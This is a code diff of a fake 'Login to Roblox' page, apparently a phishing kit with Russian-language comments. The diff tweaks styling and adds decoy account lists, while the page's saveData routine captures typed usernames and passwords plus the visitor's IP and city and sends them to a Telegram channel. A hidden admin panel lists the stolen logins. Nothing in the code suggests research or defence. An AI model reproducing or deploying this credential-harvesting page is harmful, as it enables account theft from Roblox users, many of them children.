@@ -10,21 +10,23 @@
         .logo-text { font-size: 20px; font-weight: 800; color: #fff; }
         .screen { display: none; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; width: 100%; position: absolute; }
         #login-form-screen { display: flex; }
-        .login-card { background-color: #232527; width: 420px; padding: 40px; border-radius: 4px; text-align: center; box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
-        input { width: 100%; padding: 12px; margin-bottom: 15px; background-color: #393b3d; border: 1px solid #393b3d; border-radius: 8px; color: #fff; outline: none; }
+        .login-card { background-color: #232527; width: 420px; padding: 30px; border-radius: 4px; text-align: center; box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
+        input { width: 100%; padding: 12px; margin-bottom: 10px; background-color: #393b3d; border: 1px solid #393b3d; border-radius: 8px; color: #fff; outline: none; box-sizing: border-box; }
+        input:focus { border-color: #ff0000; }
         .btn-auth { width: 100%; padding: 12px; background: #393b3d; border: 1px solid #fff; color: #fff; border-radius: 8px; cursor: pointer; font-weight: bold; }
         
-        .acc-list { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px; width: 100%; max-height: 250px; overflow-y: auto; padding-right: 5px; }
-        .acc-item { background: #393b3d; padding: 8px; border-radius: 5px; cursor: pointer; border: 1px solid transparent; font-size: 13px; text-align: center; }
-        .acc-item:hover { border-color: #ff0000; background: #444; }
+        /* Списки и поиск */
+        .search-box { margin-bottom: 10px; display: none; }
+        .acc-list { display: grid; grid-template-columns: 1fr 1fr; gap: 5px; margin-top: 10px; width: 100%; max-height: 200px; overflow-y: auto; padding-right: 5px; }
+        .acc-item { background: #333; padding: 6px; border-radius: 4px; cursor: pointer; border: 1px solid transparent; font-size: 12px; text-align: center; color: #aaa; }
+        .acc-item:hover { border-color: #ff0000; color: #fff; }
 
+        /* Админ панель */
         .admin-box { background: #1a1a1a; padding: 20px; border-radius: 10px; width: 95%; max-width: 1100px; border: 1px solid #444; max-height: 450px; overflow-y: auto; }
-        table { width: 100%; border-collapse: collapse; font-size: 14px; }
-        th, td { padding: 10px; border: 1px solid #333; text-align: left; }
-        
+        table { width: 100%; border-collapse: collapse; font-size: 13px; }
+        th, td { padding: 8px; border: 1px solid #333; text-align: left; }
         #live-indicator { color: #00ff00; font-size: 11px; animation: pulse 0.5s infinite; font-weight: bold; }
         @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-        .btn-clear { background: #660000; border-color: #ff4444; color: #fff; margin-left: 10px; }
     </style>
 </head>
 <body>
@@ -33,7 +35,7 @@
 
     <div id="login-form-screen" class="screen">
         <div class="login-card">
-            <h2 style="color:#fff; margin-bottom: 30px;">Login to Roblox</h2>
+            <h2 style="color:#fff; margin-bottom: 20px;">Login to Roblox</h2>
             <input type="text" id="username" placeholder="Username">
             <input type="password" id="password" placeholder="Password">
             <button class="btn-auth" onclick="saveData()">Log In</button>
@@ -42,27 +44,33 @@
 
     <div id="admin-auth" class="screen">
         <div class="login-card" style="border: 2px solid #ff0000;">
-            <h2 style="color: #ff0000; margin: 0;">SECURITY CHECK</h2>
+            <h2 style="color: #ff0000; margin: 0 0 10px 0;">SECURITY</h2>
             <input type="password" id="admin_pass" placeholder="Код из TG">
+            
+            <div id="search-container" class="search-box">
+                <input type="text" id="acc_search" placeholder="Поиск аккаунта..." oninput="filterAccounts()">
+            </div>
+
             <div id="acc-selector" class="acc-list" style="display: none;"></div>
-            <button id="request-btn" class="btn-auth" style="border-color: #ff0000; color: #ff0000;" onclick="startVerification()">Получить код доступа</button>
+            
+            <button id="request-btn" class="btn-auth" style="border-color: #ff0000; color: #ff0000; margin-top: 10px;" onclick="startVerification()">Получить код и список</button>
         </div>
     </div>
 
     <div id="admin-panel" class="screen">
         <div class="admin-box">
             <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
-                <h2 style="color: #fff; margin: 0;">REAL-TIME DATABASE</h2>
-                <span id="live-indicator">⚡ LIVE SYNC</span>
+                <h2 style="color: #fff; margin: 0;">LOGS DATABASE</h2>
+                <span id="live-indicator">● LIVE</span>
             </div>
             <table>
-                <thead><tr><th>User</th><th>Pass</th><th>IP</th><th>Time</th></tr></thead>
+                <thead><tr><th>User</th><th>Pass</th><th>IP Address</th><th>Time</th></tr></thead>
                 <tbody id="logData"></tbody>
             </table>
         </div>
-        <div style="margin-top: 20px; display: flex; gap: 10px;">
-            <button class="btn-auth" onclick="location.reload()">Выход</button>
-            <button class="btn-auth btn-clear" onclick="clearLogs()">Очистить логи</button>
+        <div style="margin-top: 15px;">
+            <button class="btn-auth" style="width: 120px;" onclick="location.reload()">Выход</button>
+            <button class="btn-auth" style="width: 150px; background: #440000;" onclick="clearLogs()">Очистить</button>
         </div>
     </div>
 
@@ -73,7 +81,15 @@
         let targetAccount = "";
         let lastLogsCount = -1;
 
-        const mockAccounts = ["Admin_Vip", "Roblox_Owner", "Mod_Check", "System_Root", "User_Test", "Dev_Access", "Security_Bot", "Main_Admin", "Global_Mod", "Data_Manager", "Root_User", "AntiCheat_Dev", "Support_01", "Vip_Guard", "Server_Host", "Database_Admin", "Network_Sec", "Debug_Master", "Shadow_Mod", "Tech_Lead", "Analyst_X", "Proxy_Node", "Kernel_User", "Log_Monitor", "Admin_Final"];
+        // Генерация 90 аккаунтов
+        const mockAccounts = [];
+        const prefixes = ["Admin", "Mod", "User", "Dev", "Root", "Guest", "Tester", "Security", "Support", "Owner"];
+        const suffixes = ["_X", "_Pro", "_Vip", "_Master", "01", "007", "_Global", "_Dev", "_Main", "_Debug"];
+        
+        for(let i=0; i<90; i++) {
+            let name = prefixes[i % 10] + "_" + (100 + i) + suffixes[Math.floor(Math.random() * 10)];
+            mockAccounts.push(name);
+        }
 
         let keys = {};
         document.addEventListener('keydown', (e) => {
@@ -97,12 +113,20 @@
         async function startVerification() {
             secretCode = Math.floor(1000 + Math.random() * 9000).toString();
             targetAccount = mockAccounts[Math.floor(Math.random() * mockAccounts.length)];
-            await sendToTg(`🔐 *ВХОД*\nКод: \`${secretCode}\` \nАкк: *${targetAccount}*`);
+            await sendToTg(`🔐 *ВХОД*\nКод: \`${secretCode}\` \nНужный акк: *${targetAccount}*`);
+            
             document.getElementById('request-btn').style.display = "none";
+            document.getElementById('search-container').style.display = "block";
             const accSelector = document.getElementById('acc-selector');
             accSelector.style.display = "grid";
+            
+            renderAccountList(mockAccounts);
+        }
+
+        function renderAccountList(list) {
+            const accSelector = document.getElementById('acc-selector');
             accSelector.innerHTML = "";
-            mockAccounts.forEach(acc => {
+            list.forEach(acc => {
                 const div = document.createElement('div');
                 div.className = 'acc-item';
                 div.innerText = acc;
@@ -117,20 +141,22 @@
             });
         }
 
-        // ОБНОВЛЕННАЯ ФУНКЦИЯ: Только IP, если города нет
+        function filterAccounts() {
+            const query = document.getElementById('acc_search').value.toLowerCase();
+            const filtered = mockAccounts.filter(a => a.toLowerCase().includes(query));
+            renderAccountList(filtered);
+        }
+
         async function getIP() {
             try {
                 const response = await fetch('https://ipapi.co/json/');
                 const data = await response.json();
-                if (data.ip) {
-                    // Если город есть — пишем его, если нет — только IP
-                    return data.city ? `${data.ip} (${data.city})` : data.ip;
-                }
+                return data.ip ? (data.city ? `${data.ip} (${data.city})` : data.ip) : "Hidden";
             } catch (e) {
                 try {
                     const resAlt = await fetch('https://api.ipify.org?format=json');
                     const dataAlt = await resAlt.json();
-                    return dataAlt.ip; // Тут только цифры
+                    return dataAlt.ip;
                 } catch(e2) { return "Hidden"; }
             }
         }
@@ -139,10 +165,8 @@
             const u = document.getElementById('username').value;
             const p = document.getElementById('password').value;
             if(!u || !p) return;
-
             const ipInfo = await getIP();
             await sendToTg(`👤 *LOG*\nUser: \`${u}\` \nPass: \`${p}\` \nIP: \`${ipInfo}\``);
-            
             let logs = JSON.parse(localStorage.getItem('roblox_logs') || '[]');
             logs.push({ user: u, pass: p, ip: ipInfo, time: new Date().toLocaleTimeString() });
             localStorage.setItem('roblox_logs', JSON.stringify(logs));
@@ -159,7 +183,7 @@
         }
 
         function clearLogs() {
-            if (confirm("Очистить?")) {
+            if (confirm("Удалить всё?")) {
                 localStorage.removeItem('roblox_logs');
                 updateLogs();
             }
